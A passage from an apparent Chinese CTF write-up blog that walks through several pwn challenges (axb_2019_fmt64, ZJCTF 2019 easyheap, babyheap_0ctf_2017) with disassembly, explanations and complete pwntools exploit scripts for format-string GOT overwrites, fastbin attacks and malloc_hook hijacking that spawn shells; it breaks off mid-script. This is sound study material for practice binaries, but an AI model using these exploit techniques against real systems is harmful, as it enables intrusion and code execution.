联想到我们上面做的小实验 所以这里我们可以控制rax和rdi寄存器的值\n接着看下一个函数\nint hao_kang_de()&#123;  signed __int64 v0; // rax  puts(&quot;wait!! i will give you something&quot;);  v0 = sys_write(0, 0LL, 0LL);  return puts(&quot;hhhh~i just tell a joke&quot;);&#125;\n\n转化成汇编形式\n.text:000000000000087B                 push    rbp.text:000000000000087C                 mov     rbp, rsp.text:000000000000087F                 lea     rdi, s          ; &quot;wait!! i will give you something&quot;.text:0000000000000886                 call    _puts.text:000000000000088B                 mov     rax, 1.text:0000000000000892                 mov     rdi, 0          ; fd.text:0000000000000899                 mov     rsi, 0          ; buf.text:00000000000008A0                 mov     rdx, 0          ; count.text:00000000000008A7                 syscall                 ; LINUX - sys_write.text:00000000000008A9                 lea     rdi, aHhhhIJustTellA ; &quot;hhhh~i just tell a joke&quot;.text:00000000000008B0                 call    _puts.text:00000000000008B5                 nop.text:00000000000008B6                 pop     rbp.text:00000000000008B7                 retn\n\n是采用syscall的方法调用的write  联想到我们可以修改rax和rdi 所以这里可以直接partical write的方法跳转到0x899这里 进行系统调用\n完整exp:\nfrom pwn import *context.log_level = &#x27;debug&#x27;elf = ELF(&#x27;./pwn&#x27;)libc = ELF(&#x27;./libc-2.31.so&#x27;)#libc = ELF(&quot;./buu_libc_ubuntu16_64&quot;)context.arch = &quot;amd64&quot;context.terminal = [&#x27;tmux&#x27;,&#x27;splitw&#x27;,&#x27;-h&#x27;]def exploit():    io=process(&#x27;./pwn&#x27;)    io.recvuntil(&quot;if you give me your number,i will give you some hao_kang_de&quot;)    payload = b&#x27;59&#x27;+b&#x27;/bin/sh\\x00&#x27;    payload += cyclic(0x2e)+p16(0x899)    io.send(payload)    io.recvuntil(&quot;anything want to say?&quot;)    payload = p64(0)    # gdb.attach(io,&#x27;b *$rebase(0x976)&#x27;)    # pause(0)    io.send(payload)    # pause()    io.sendline(&quot;cat flag&quot;)    result = io.recv(timeout=1)    io.interactive()if __name__ == &#x27;__main__&#x27;:    try_count = 0    while(True):        try:            exploit()        except:            try_count += 1            print(&quot;failed :&#123;&#125;&quot;.format(try_count))\n\n这题还看到其他师傅有比较新奇的思路 用的是格式化字符串泄露libc基址 试着跟着复现了一下 感觉收获还是很多的\n因为这题开启了PIE 所以没有办法利用第一个栈溢出到处跑 只能说试着爆破最后两个字节或者是覆盖最后一个字节来做到同页内迁移\n正常情况下eeee_wantboy函数的返回地址是\n\n如果我们只覆盖最后一个字节就可以做到同页内的迁移 可以跳转到0x555555554900 - 0x555555554a00的任意地址\n也就是eeee_wantboy函数的一部分和main函数\n原本的程序执行顺序是先read再提供栈的地址 通过跳转的办法我们就可以获得栈地址后再考虑如何构造rop链\n同时你要注意到read函数的rsi参数是根据rbp的地址来寻找的\n.text:0000000000000943                 lea     rax, [rbp+var_130].text:000000000000094A                 mov     edx, 100h       ; nbytes.text:000000000000094F                 mov     rsi, rax        ; buf.text:0000000000000952                 mov     edi, 0          ; fd.text:0000000000000957                 call    _read\n\n如果用垃圾数据覆盖rbp 就丢失了这次read的机会\n这里把漏洞点放到没有指定任何参数 而是单独输出字符串的printf函数上面 我们只需要控制rdi寄存器就可以触发格式化字符串漏洞\n这里也是借助strtol函数的特性来操控rdi寄存器\nfrom pwn import *context.log_level = &#x27;debug&#x27;elf = ELF(&#x27;./pwn&#x27;)libc = ELF(&#x27;./libc-2.31.so&#x27;)io = process(&quot;./pwn&quot;)#libc = ELF(&quot;./buu_libc_ubuntu16_64&quot;)context.arch = &quot;amd64&quot;context.terminal = [&#x27;tmux&#x27;,&#x27;splitw&#x27;,&#x27;-h&#x27;]io.recvuntil(&quot;if you give me your number,i will give you some hao_kang_de&quot;)payload = cyclic(0x38)+p8(0x79)io.send(payload)io.recvuntil(&quot;heyhey , hao_kang_de is &quot;)stack_addr = int(io.recv(12),16)success(&quot;stack_addr :&quot;+hex(stack_addr))io.recvuntil(&quot;anything want to say?&quot;)io.send(b&#x27;chen&#x27;)io.recvuntil(&quot;if you give me your number,i will give you some hao_kang_de&quot;)payload = b&#x27;%7$p|%11$p&#x27;.ljust(0x30,b&#x27;\\x00&#x27;)+p64(stack_addr+0x218)+p8(0x12)io.send(payload)io.recvuntil(&quot;anything want to say?&quot;)gdb.attach(io,&#x27;b *$rebase(0x912)&#x27;)pause(0)io.send(b&#x27;chen&#x27;)pause()\n\n\n这里的rbp之所以用stack_addr+0x218覆盖 也是为了使得第二次执行eeee函数时的read的rsi参数正确 我们预想的是直接写到rsp处 这样在执行read指令时 其内部存在的ret指令就可以将rop链的首部弹出到rip 控制程序执行流\n这个偏移并不是唯一的 可以自己更换数值多动调 按我下面的办法\n\n此时rsp是指向0x7ffc8d148b50处 而我们的rbp设置成了stack_addr+0x218 为0x7ffc8d148c28\n所以read读入的地址是rbp-0x130 也就是0x7ffc8d148af8\n此时s进入call read指令\n\n当其执行到ret准备执行下一个指令时的rsp指针指向0x7ffc8d148b48\n所以我们read需要填充的垃圾数据就是0x7ffc8d148b48-0x7ffc8d148af8&#x3D;0x50\n另外执行system的时候还需要注意栈对齐\n完整exp:\nfrom pwn import *context.log_level = &#x27;debug&#x27;elf = ELF(&#x27;./pwn&#x27;)libc = ELF(&#x27;./libc-2.31.so&#x27;)io = process(&quot;./pwn&quot;)#libc = ELF(&quot;./buu_libc_ubuntu16_64&quot;)context.arch = &quot;amd64&quot;context.terminal = [&#x27;tmux&#x27;,&#x27;splitw&#x27;,&#x27;-h&#x27;]io.recvuntil(&quot;if you give me your number,i will give you some hao_kang_de&quot;)payload = cyclic(0x38)+p8(0x79)io.send(payload)io.recvuntil(&quot;heyhey , hao_kang_de is &quot;)stack_addr = int(io.recv(12),16)success(&quot;stack_addr :&quot;+hex(stack_addr))io.recvuntil(&quot;anything want to say?&quot;)io.send(b&#x27;chen&#x27;)io.recvuntil(&quot;if you give me your number,i will give you some hao_kang_de&quot;)payload = b&#x27;%7$p|%11$p&#x27;.ljust(0x30,b&#x27;\\x00&#x27;)+p64(stack_addr+0x218)+p8(0x12)io.send(payload)io.recvuntil(&quot;anything want to say?&quot;)# gdb.attach(io,&#x27;b *$rebase(0x912)&#x27;)# pause(0)io.send(b&#x27;chen&#x27;)libc_start_main_addr = int(io.recvuntil(&quot;|&quot;,drop = True),16)-243success(&quot;libc_start_main_addr :&quot;+hex(libc_start_main_addr))elf_base = int(io.recv(14),16)-0x978success(&quot;elf_base :&quot;+hex(elf_base))libc_addr = libc_start_main_addr - libc.sym[&#x27;__libc_start_main&#x27;]success(&quot;libc_addr :&quot;+hex(libc_addr))system_addr = libc_addr + libc.sym[&#x27;system&#x27;]binsh_addr = libc_addr + next(libc.search(b&#x27;/bin/sh&#x27;))rdi_addr = elf_base + 0x0000000000000a13io.recvuntil(&quot;anything want to say?&quot;)ret_addr = elf_base + 0x000000000000069epayload = b&#x27;a&#x27;*0x50+p64(ret_addr)+p64(rdi_addr)+p64(binsh_addr)+p64(system_addr)io.send(payload)io.interactive()\n\n","categories":["wp"]},{"title":"axb_2019_fmt64","url":"/2023/02/15/axb-2019-fmt64/","content":"这题收获还是很大的 学会了自己构造任意写的格式化字符串漏洞payload\nchecksec看一下保护机制\n[!] Could not populate PLT: invalid syntax (unicorn.py, line 110)[*] &#x27;/home/chen/pwn&#x27;    Arch:     amd64-64-little    RELRO:    Partial RELRO    Stack:    No canary found    NX:       NX enabled    PIE:      No PIE (0x400000)\n\nida查看一下反汇编代码\nint __cdecl __noreturn main(int argc, const char **argv, const char **envp)&#123;  char s[272]; // [rsp+10h] [rbp-250h] BYREF  char format[312]; // [rsp+120h] [rbp-140h] BYREF  unsigned __int64 v5; // [rsp+258h] [rbp-8h]  v5 = __readfsqword(0x28u);  setbuf(stdout, 0LL);  setbuf(stdin, 0LL);  setbuf(stderr, 0LL);  puts(    &quot;Hello,I am a computer Repeater updated.\\n&quot;    &quot;After a lot of machine learning,I know that the essence of man is a reread machine!&quot;);  puts(&quot;So I&#x27;ll answer whatever you say!&quot;);  while ( 1 )  &#123;    alarm(3u);    memset(s, 0, 0x101uLL);    memset(format, 0, 0x12CuLL);    printf(&quot;Please tell me:&quot;);    read(0, s, 0x100uLL);    sprintf(format, &quot;Repeater:%s\\n&quot;, s);    if ( (unsigned int)strlen(format) &gt; 0x10E )      break;    printf(format);  &#125;  printf(&quot;what you input is really long!&quot;);  exit(0);&#125;\n\n很常规的64位格式化字符串 但是多了个函数alarm 限制了进程持续的时间\n如果我们使用pwntools内置的函数fmtstr_payload来生成payload的话 会由于字节过多发送失败 所以这里尝试一下自己构造\nfrom pwn import*from struct import pack#io = remote(&quot;node4.buuoj.cn&quot;,26248)io = process(&quot;./pwn&quot;)context.log_level = &quot;debug&quot;elf = ELF(&quot;./pwn&quot;)#libc = ELF(&quot;./buu_libc_ubuntu16_64&quot;)libc = ELF(&quot;./locate&quot;)context.terminal = [&#x27;tmux&#x27;,&#x27;splitw&#x27;,&#x27;-h&#x27;]context.arch = &quot;amd64&quot;def debug():    gdb.attach(io)    pause()io.recvuntil(&quot;Please tell me:&quot;)#gdb.attach(io,&#x27;b *0x400957&#x27;)payload = b&#x27;%9$saaaa&#x27;+p64(elf.got[&#x27;puts&#x27;])io.sendline(payload)puts_addr = u64(io.recvuntil(&quot;\\x7f&quot;)[-6:].ljust(8,b&#x27;\\x00&#x27;))success(hex(puts_addr))libc_addr = puts_addr - libc.sym[&#x27;puts&#x27;]success(hex(libc_addr))\n\n泄露libc基址很简单 只要注意一下64位的p64会附带\\x00 导致printf读取到后直接截断了 无法正常泄露 得把p64放在后面\n接下来的难点在于说如何任意地址写\n这题要获取shell的办法无非就是覆盖函数的got表 修改为system 随后参数设置为&#x2F;bin&#x2F;sh 或者是onegadget\n而格式化字符串任意写是依靠%x$n 这个格式符是将其前面输出的字节赋值到对应的偏移地址\n如果我们想要任意写的只是小额的数值 我们可以这样构造payload\npayload = b&#x27;a&#x27;*padding+b&#x27;%$xn&#x27;+p64(ptr_addr)# 其中padding是想要修改的数值 x是varge参数的偏移\n\n但是如果我们想要赋值onegadget到exit函数的got表 那么可想而知 需要庞大的字节数 不仅仅题目很少会给我们无限制的读入数据 如此庞大的数据还会导致程序运行缓慢 何况这题还调用了alarm函数\n那么换个想法 如果我们只是修改单字节或者是双字节呢?\n因为每个函数的真实地址差别只在于最后几个字节  前面的都是一样的  这样就可以大大减少需要的字节数\n对于一个地址来说 其在内存一共占用了8个字节 而每个字节都存放着相应的数值 比如说下图\n\n0x7f7458560971处的内容就是0x55\n\n我们对比一下got表中存放的真实地址 发现只有后5位是不一样的 不过由于没有办法单独修改1位 所以我们需要修改后三个字节的数据\n我们知道在n前面添加一个h就可以减半要操作的字节数 %$xhhn就可以做到修改单字节的数据\n所以只能修改2的倍数的字节 要想修改三个字节的话 我们需要修改两次 一次修改单字节 一次修改双字节\n接下来还有一个问题在于 函数的真实地址每次程序运行的时候都会变化 我们肉眼当然是可以读出地址的后三位\n但是要如何利用脚本来实现读取呢?\n这里介绍一下算术右移和与运算\n算术右移: \n对于一个二进制数 例如11110000来说  其符号位为1 如果是逻辑右移的话 不需要考虑符号位 而算术右移 如果符号位是1的话 就需要用1来补全 反之 用0来补全 比如算术右移3\n那么这个二进制数就会变成  (1)(1)(1)11110   括号的表示是补全的\n与运算:\n二进制数a  10101010\n二进制数b  11111111\n二者进行与运算的话 对应的位依次进行比较 \n如果两个位都是1的话 那么与运算之后的结果就是1 除此之外的所有情况 与运算后的结果都是0\n那么a和b与运算后的结果就是  10101010\n与运算的作用在于 如果我们是和0xff来与运算 其二进制数是11111111\n就会保留与之运算的数的最后一个字节的值\n比如:\nsystem_addr =0x7fb60fe40420# 11111111 10110110 00001111 11100100 00000100 00100000 system_addr# 00000000 00000000 00000000 00000000 11111111 11111111 0xffff# 00000000 00000000 00000000 00000000 00000100 00100000 0x0420\n\n用system_addr去和0xffff与运算 最后得到的结果就是0x0420 为system_addr的最后两个字节\n如果再用上算术右移 那么我们就可以获取到倒数第三个字节的值\nsystem_addr =0x7fb60fe40420# 11111111 10110110 00001111 11100100 00000100 00100000 system_addr# 11111111 11111111 11111111 10110110 00001111 11100100 system_addr &gt;&gt; 16# 00000000 00000000 00000000 00000000 00000000 11111111 0xff# 00000000 00000000 00000000 00000000 00000000 11100100 0xe4\n\n最后得到的值就是system_addr的倒数第三个字节\n至于输出足够的字节来使%n读取到从而任意写  则是采用%c这个格式化字符 其作用是输出x个字节 如果不够则用\\x00补齐\n比如 printf(“%10c”) 就会输出10个空字符\n那么最后的payload就是这样构造\npayload = b&#x27;%&#x27;+str(high_addr-9).encode()+b&#x27;c%12$hhn&#x27;+b&#x27;%&#x27;+str(low_addr-high_addr).encode()+b&#x27;c%13$hn&#x27;payload = payload.ljust(32,b&#x27;\\x00&#x27;)payload += p64(strlen_got+2)+p64(strlen_got)\n\n%n是在其之前输出了多少字节的字符就将对应值赋给对应的地址  而在这一题中 先行输出了 “Repeater:” 所以需要-9\n而encode()则是在python3中需要发送byte型的数据 所以需要进行转化 随后的low_addr-high_addr也是同理\n完整exp:\nfrom pwn import*from struct import pack#io = remote(&quot;node4.buuoj.cn&quot;,26248)io = process(&quot;./pwn&quot;)context.log_level = &quot;debug&quot;elf = ELF(&quot;./pwn&quot;)#libc = ELF(&quot;./buu_libc_ubuntu16_64&quot;)libc = ELF(&quot;./locate&quot;)context.terminal = [&#x27;tmux&#x27;,&#x27;splitw&#x27;,&#x27;-h&#x27;]context.arch = &quot;amd64&quot;def debug():    gdb.attach(io)    pause()io.recvuntil(&quot;Please tell me:&quot;)#gdb.attach(io,&#x27;b *0x400957&#x27;)payload = b&#x27;%9$saaaa&#x27;+p64(elf.got[&#x27;puts&#x27;])io.sendline(payload)puts_addr = u64(io.recvuntil(&quot;\\x7f&quot;)[-6:].ljust(8,b&#x27;\\x00&#x27;))success(hex(puts_addr))libc_addr = puts_addr - libc.sym[&#x27;puts&#x27;]success(hex(libc_addr))io.recvuntil(&quot;Please tell me:&quot;)printf_got = elf.got[&#x27;printf&#x27;]strlen_got = elf.got[&#x27;strlen&#x27;]alarm_got = elf.got[&#x27;alarm&#x27;]strlen_got = elf.got[&#x27;strlen&#x27;]alarm_addr = libc_addr + libc.sym[&#x27;alarm&#x27;]system_addr = libc_addr + libc.sym[&#x27;system&#x27;]#7a4420onegadget_addr = libc_addr + 0xf02a4high_addr = (onegadget_addr&gt;&gt;16)&amp;0xfflow_addr = onegadget_addr&amp;0xffffpayload = b&#x27;%&#x27;+str(high_addr-9).encode()+b&#x27;c%12$hhn&#x27;+b&#x27;%&#x27;+str(low_addr-high_addr).encode()+b&#x27;c%13$hn&#x27;payload = payload.ljust(32,b&#x27;\\x00&#x27;)payload += p64(strlen_got+2)+p64(strlen_got)io.sendline(payload)io.recvuntil(&quot;Please tell me:&quot;)io.sendline(b&#x27;aaaa&#x27;)io.interactive()\n\n","categories":["wp"]},{"title":"ZJCTF 2019.easyheap","url":"/2022/11/21/ZJCTF-2019-easyheap/","content":"这一题的预期解因为buu的docker环境问题无法实现 这里使用的是通过覆盖free_got表为system来系统调用\n分析一下程序\n[*] &#x27;/home/chen/pwn&#x27;    Arch:     amd64-64-little    RELRO:    Partial RELRO    Stack:    Canary found    NX:       NX enabled    PIE:      No PIE (0x400000)\n\n没有开启FULL RELRO 意味着可以覆写got表\nida继续跟进 main函数很常规 这里重点关注一下add free edit这三个函数\nunsigned __int64 create_heap()&#123;  int i; // [rsp+4h] [rbp-1Ch]  size_t size; // [rsp+8h] [rbp-18h]  char buf[8]; // [rsp+10h] [rbp-10h] BYREF  unsigned __int64 v4; // [rsp+18h] [rbp-8h]  v4 = __readfsqword(0x28u);  for ( i = 0; i &lt;= 9; ++i )  &#123;    if ( !*(&amp;heaparray + i) )    &#123;      printf(&quot;Size of Heap : &quot;);      read(0, buf, 8uLL);      size = atoi(buf);      *(&amp;heaparray + i) = malloc(size);      if ( !*(&amp;heaparray + i) )      &#123;        puts(&quot;Allocate Error&quot;);        exit(2);      &#125;      printf(&quot;Content of heap:&quot;);      read_input(*(&amp;heaparray + i), size);      puts(&quot;SuccessFul&quot;);      return __readfsqword(0x28u) ^ v4;    &#125;  &#125;  return __readfsqword(0x28u) ^ v4;&#125;\n\n申请的堆块存储到了bss段上的heaparray数组里面 同时每个指针占据8个字节\nunsigned __int64 edit_heap()&#123;  int v1; // [rsp+4h] [rbp-1Ch]  __int64 v2; // [rsp+8h] [rbp-18h]  char buf[8]; // [rsp+10h] [rbp-10h] BYREF  unsigned __int64 v4; // [rsp+18h] [rbp-8h]  v4 = __readfsqword(0x28u);  printf(&quot;Index :&quot;);  read(0, buf, 4uLL);  v1 = atoi(buf);  if ( v1 &lt; 0 || v1 &gt; 9 )  &#123;    puts(&quot;Out of bound!&quot;);    _exit(0);  &#125;  if ( *(&amp;heaparray + v1) )  &#123;    printf(&quot;Size of Heap : &quot;);    read(0, buf, 8uLL);    v2 = atoi(buf);    printf(&quot;Content of heap : &quot;);    read_input(*(&amp;heaparray + v1), v2);    puts(&quot;Done !&quot;);  &#125;  else  &#123;    puts(&quot;No such heap !&quot;);  &#125;  return __readfsqword(0x28u) ^ v4;&#125;\n\n提供了堆溢出的机会 可以供我们修改size域来合并chunk\nunsigned __int64 delete_heap()&#123;  int v1; // [rsp+Ch] [rbp-14h]  char buf[8]; // [rsp+10h] [rbp-10h] BYREF  unsigned __int64 v3; // [rsp+18h] [rbp-8h]  v3 = __readfsqword(0x28u);  printf(&quot;Index :&quot;);  read(0, buf, 4uLL);  v1 = atoi(buf);  if ( v1 &lt; 0 || v1 &gt; 9 )  &#123;    puts(&quot;Out of bound!&quot;);    _exit(0);  &#125;  if ( *(&amp;heaparray + v1) )  &#123;    free(*(&amp;heaparray + v1));    *(&amp;heaparray + v1) = 0LL;    puts(&quot;Done !&quot;);  &#125;  else  &#123;    puts(&quot;No such heap !&quot;);  &#125;  return __readfsqword(0x28u) ^ v3;&#125;\n\nfree后把指针清零了 没有办法uaf\n了解完程序主体后 结合一下版本为ubuntu16 没有tcache 并且还有堆溢出 可以合并堆块 从而获得两个指向同一空间的chunk 这样就可以修改fastbinchunk的fd域 获得任意地址写的机会\n接着再来关注一下这个heaparray 我们看完了代码后 可以得知  edit函数 是修改heaparray所指向的地址的内容\n那如果我们利用上文提到的任意写的漏洞 将heaparray的其中一个指针修改为free_got 那么不就可以修改got表 成功进行系统调用了\n不过fastbin attack需要注意的是  glibc对其取出bin时有检查机制  我们的fakechunk的地址需要合理构造 才能成功取出\nfrom pwn import*#io = process(&quot;./pwn&quot;)io = remote(&quot;node4.buuoj.cn&quot;,29611)context.log_level = &quot;debug&quot;elf = ELF(&quot;./pwn&quot;)def add(size,payload):    io.recvuntil(&quot;Your choice :&quot;)    io.sendline(b&quot;1&quot;)    io.recvuntil(&quot;Size of Heap : &quot;)    io.sendline(str(size))    io.recvuntil(&quot;Content of heap:&quot;)    io.sendline(payload)    io.recvuntil(&quot;SuccessFul&quot;)def edit(index,size,payload):    io.recvuntil(&quot;Your choice :&quot;)    io.sendline(b&quot;2&quot;)    io.recvuntil(&quot;Index :&quot;)    io.sendline(str(index))    io.recvuntil(&quot;Size of Heap : &quot;)    io.sendline(str(size))    io.recvuntil(&quot;Content of heap : &quot;)    io.sendline(payload)    io.recvuntil(&quot;Done !&quot;)def delete(index):    io.recvuntil(&quot;Your choice :&quot;)    io.sendline(b&quot;3&quot;)    io.recvuntil(&quot;Index :&quot;)    io.sendline(str(index))    io.recvuntil(&quot;Done !&quot;)free_got = elf.got[&#x27;free&#x27;]system_addr = 0x400700heaparray_addr = 0x6020E0add(0x18,b&quot;1&quot;)#0add(0x68,b&quot;1&quot;)#1add(0x68,b&quot;1&quot;)#2add(0x20,b&quot;1&quot;)#3payload = cyclic(0x18)+p16(0xe1)edit(0,len(payload),payload)delete(1)add(0x68,b&quot;1&quot;)#4&amp;1add(0x68,b&quot;1&quot;)#5&amp;2delete(2)payload = p64(heaparray_addr-51)edit(4,len(payload),payload)\n\n这部分代码的思路 我前面几题堆wp也有涉及 老办法了 不懂具体流程的可以翻看以往wp\n重点在于最后我们要任意写的地方 位于heaparray-51的地方 这是为什么？ 我们gdb动调看看\n\n如果不-51的话 此时我们想要伪造的chunk的size域值为878030 不符合glibc的检查机制 如果想要申请出来时 程序就会强行终止\n[DEBUG] Received 0x9b3 bytes:    b&quot;*** Error in `./pwn&#x27;: malloc(): memory corruption (fast): 0x00000000006020f0 ***\\n&quot;    b&#x27;======= Backtrace: =========\\n&#x27;    b&#x27;/lib/x86_64-linux-gnu/libc.so.6(+0x777f5)[0x7f93309967f5]\\n&#x27;    b&#x27;/lib/x86_64-linux-gnu/libc.so.6(+0x82679)[0x7f93309a1679]\\n&#x27;    b&#x27;/lib/x86_64-linux-gnu/libc.so.6(__libc_malloc+0x54)[0x7f93309a31d4]\\n&#x27;    b&#x27;./pwn[0x4009b5]\\n&#x27;    b&#x27;./pwn[0x400ce1]\\n&#x27;    b&#x27;/lib/x86_64-linux-gnu/libc.so.6(__libc_start_main+0xf0)[0x7f933093f840]\\n&#x27;    b&#x27;./pwn[0x4007b9]\\n&#x27;    b&#x27;======= Memory map: ========\\n&#x27;    b&#x27;00400000-00402000 r-xp 00000000 08:01 1066204                            /home/chen/pwn\\n&#x27;    b&#x27;00601000-00602000 r--p 00001000 08:01 1066204                            /home/chen/pwn\\n&#x27;    b&#x27;00602000-00603000 rw-p 00002000 08:01 1066204                            /home/chen/pwn\\n&#x27;    b&#x27;02381000-023a2000 rw-p 00000000 00:00 0                                  [heap]\\n&#x27;    b&#x27;7f932c000000-7f932c021000 rw-p 00000000 00:00 0 \\n&#x27;    b&#x27;7f932c021000-7f9330000000 ---p 00000000 00:00 0 \\n&#x27;    b&#x27;7f9330709000-7f933071f000 r-xp 00000000 08:01 136633                     /lib/x86_64-linux-gnu/libgcc_s.so.1\\n&#x27;    b&#x27;7f933071f000-7f933091e000 ---p 00016000 08:01 136633                     /lib/x86_64-linux-gnu/libgcc_s.so.1\\n&#x27;    b&#x27;7f933091e000-7f933091f000 rw-p 00015000 08:01 136633                     /lib/x86_64-linux-gnu/libgcc_s.so.1\\n&#x27;    b&#x27;7f933091f000-7f9330adf000 r-xp 00000000 08:01 155906                     /lib/x86_64-linux-gnu/libc-2.23.so\\n&#x27;    b&#x27;7f9330adf000-7f9330cdf000 ---p 001c0000 08:01 155906                     /lib/x86_64-linux-gnu/libc-2.23.so\\n&#x27;    b&#x27;7f9330cdf000-7f9330ce3000 r--p 001c0000 08:01 155906                     /lib/x86_64-linux-gnu/libc-2.23.so\\n&#x27;    b&#x27;7f9330ce3000-7f9330ce5000 rw-p 001c4000 08:01 155906                     /lib/x86_64-linux-gnu/libc-2.23.so\\n&#x27;    b&#x27;7f9330ce5000-7f9330ce9000 rw-p 00000000 00:00 0 \\n&#x27;    b&#x27;7f9330ce9000-7f9330d0f000 r-xp 00000000 08:01 155898                     /lib/x86_64-linux-gnu/ld-2.23.so\\n&#x27;    b&#x27;7f9330ef4000-7f9330ef7000 rw-p 00000000 00:00 0 \\n&#x27;    b&#x27;7f9330f0d000-7f9330f0e000 rw-p 00000000 00:00 0 \\n&#x27;    b&#x27;7f9330f0e000-7f9330f0f000 r--p 00025000 08:01 155898                     /lib/x86_64-linux-gnu/ld-2.23.so\\n&#x27;    b&#x27;7f9330f0f000-7f9330f10000 rw-p 00026000 08:01 155898                     /lib/x86_64-linux-gnu/ld-2.23.so\\n&#x27;    b&#x27;7f9330f10000-7f9330f11000 rw-p 00000000 00:00 0 \\n&#x27;    b&#x27;7ffc6a9c0000-7ffc6a9e1000 rw-p 00000000 00:00 0                          [stack]\\n&#x27;    b&#x27;7ffc6a9ed000-7ffc6a9f0000 r--p 00000000 00:00 0                          [vvar]\\n&#x27;    b&#x27;7ffc6a9f0000-7ffc6a9f2000 r-xp 00000000 00:00 0                          [vdso]\\n&#x27;    b&#x27;ffffffffff600000-ffffffffff601000 r-xp 00000000 00:00 0                  [vsyscall]\\n&#x27;\n\n于是我们只好利用gdb动调 最后在-51的位置 可以使我们构造的chunk结构通过glibc的检查\n\nadd(0x68,b&quot;/bin/sh&quot;)add(0x68,b&quot;1&quot;)payload = cyclic(51)+p64(free_got)edit(5,len(payload),payload)payload = p64(system_addr)edit(2,len(payload),payload)io.recvuntil(&quot;Your choice :&quot;)io.sendline(b&quot;3&quot;)io.recvuntil(&quot;Index :&quot;)io.sendline(b&quot;4&quot;)io.interactive()\n\n随后我们将该chunk申请出来 并且计算一下偏移 将我们想要修改的heaparray覆盖成free_got \n这样我们下次想要利用edit函数修改其内容时  就会转化成修改free_got的内容\n然后我们释放掉一个内容为&#x2F;bin&#x2F;sh的堆块 就相当于执行了system（”&#x2F;bin&#x2F;sh”）\n但是在这里我遇到了个问题  不能使用我们之前为了方便打包好的函数\n因为多接收了个done  但是系统调用后并不会输出done 所以这里会有卡壳\n","categories":["wp"]},{"title":"babyheap_0ctf_2017","url":"/2022/11/14/babyheap-0ctf-2017/","content":"查看一下保护机制\nArch:     amd64-64-littleRELRO:    Full RELROstack:    Canary foundNX:       NX enabledPIE:      PIE enabled\n\nFULL RELRO要注意一下\nida反编译一下\n__int64 __fastcall main(__int64 a1, char **a2, char **a3)&#123;  __int64 v4; // [rsp+8h] [rbp-8h]  v4 = sub_B70(a1, a2, a3);  while ( 1 )  &#123;    menu();    switch ( choice() )    &#123;      case 1LL:        add(v4);        break;      case 2LL:        edit(v4);        break;      case 3LL:        delete(v4);        break;      case 4LL:        print(v4);        break;      case 5LL:        return 0LL;      default:        continue;    &#125;  &#125;&#125;\n\n需要留意的是释放堆块的时候 指针也置零了 没有办法uaf\n但是edit可以进行堆溢出\n题目docker环境为16.04 那么显而易见 有输出函数以及堆溢出的机会\n这里用到unsortedbin泄露基址\n#前置exp:from pwn import*context.log_level = &quot;debug&quot;#io = process(&quot;./pwn&quot;)io = remote(&quot;node4.buuoj.cn&quot;,25931)elf = ELF(&quot;./pwn&quot;)libc = ELF(&quot;./libc&quot;)def add(size):    io.recvuntil(&quot;Command:&quot;)    io.sendline(b&quot;1&quot;)    io.recvuntil(&quot;Size:&quot;)    io.sendline(str(size))    io.recv()def edit(index,size,payload):    io.recvuntil(&quot;Command:&quot;)    io.sendline(b&quot;2&quot;)    io.recvuntil(&quot;Index:&quot;)    io.sendline(str(index))    io.recvuntil(&quot;Size: &quot;)    io.sendline(str(size))    io.recvuntil(&quot;Content:&quot;)    io.sendline(payload)def delete(index):    io.recvuntil(&quot;Command:&quot;)    io.sendline(b&quot;3&quot;)    io.recvuntil(&quot;Index:&quot;)    io.sendline(str(index))def show(index):    io.recvuntil(&quot;Command:&quot;)    io.sendline(b&quot;4&quot;)    io.recvuntil(&quot;Index:&quot;)    io.sendline(str(index))\n\n先申请一个chunk0 用于堆溢出覆盖chunk1的size域 从而使chunk1和chunk2合并\nadd(0x18)#0add(0x68)#1add(0x68)#2add(0x20)#3   #chunk3的作用则是防止堆块释放后和top chunk合并payload = cyclic(0x18)+b&quot;\\xe1&quot;edit(0,len(payload),payload)\n\ngdb看一下此时堆块结构\n\n可以看到已经成功合并了chunk1和chunk2\n此时我们free掉chunk1\n该合并堆块就会进入到unsortedbin\n此时其fd和bk就指向了main_arena+88\n我们如果再申请一个0x68大小的chunk\n此时bin将会把前半部分的堆块分配出来\n于是fd和bk的内容我们就可以通过print新申请的堆块打印出来\nadd(0x68)#3&amp;1show(2)io.recvuntil(&quot;Content:&quot;)addr = u64(io.recvuntil(&quot;\\x7f&quot;)[-6:].ljust(8,b&quot;\\x00&quot;))\n\n还差一点 要如果才能确定偏移 从而计算出libc基址\n这里我们进行gdb动调 我们需要求出main_arena+88和libc基址的偏移\n\n则可求得 偏移 &#x3D; 0x7f35f3b9bb78-0x7f35f37d7000\n由于开启了FULL RELRO 我们并没有办法篡改got表\n但是此时是ubuntu16.04版本环境 我们想到了使用malloc_hook的攻击方法\nlibc_addr = addr - (0x7fc2d9938b78-0x7fc2d9574000)malloc_hook = libc_addr+libc.sym[&quot;__malloc_hook&quot;]system_addr = libc_addr + libc.sym[&#x27;system&#x27;]\n\n此时我们再次申请一个大小为0x68的chunk 它会分配到剩下一半的unsortedbin的空间\n但是你要注意到 chunk2的指针不是还没被置零吗 chunk2和我们新申请到的chunk指向了同一片空间\n这不就可以做到uaf吗 于是我们再次释放chunk2 然后编辑chunk4的内容 覆盖chunk2的fd域 就可以使我们目标地址串连到fastbin上\nadd(0x68)#4&amp;2delete(2)edit(4,len(p64(malloc_hook)),p64(malloc_hook-0x23))\n\n\n此时我们连续申请两个堆块 第二个堆块就是分配到对应地址的空间\n此时我们编辑第二个堆块 覆盖malloc_hook为onegadget地址\n这样我们在申请新chunk时系统调用malloc函数时就会调用onegadget\nadd(0x68)#4 add(0x68)#5 onegadget = 0x4526a+libc_addr  #0x45216  0x4526a  0xf02a4  0xf1147payload = cyclic(0x8+0xb)+p64(onegadget)edit(5,len(payload),payload)add(0x30)io.interactive()\n\n完整exp:\nfrom pwn import*context.log_level = &quot;debug&quot;io = process(&quot;./pwn&quot;)#io = remote(&quot;node4.buuoj.cn&quot;,25931)elf = ELF(&quot;./pwn&quot;)libc = ELF(&quot;./libc&quot;)def add(size):    io.recvuntil(&quot;Command:&quot;)    io.sendline(b&quot;1&quot;)    io.recvuntil(&quot;Size:&quot;)    io.sendline(str(size))    io.recv()def edit(index,size,payload):    io.recvuntil(&quot;Command:&quot;)    io.sendline(b&quot;2&quot;)    io.recvuntil(&quot;Index:&quot;)    io.sendline(str(index))    io.recvuntil(&quot;Size: &quot;)    io.sendline(str(size))    io.recvuntil(&quot;Content:&quot;)    io.sendline(payload)def delete(index):    io.recvuntil(&quot;Command:&quot;)    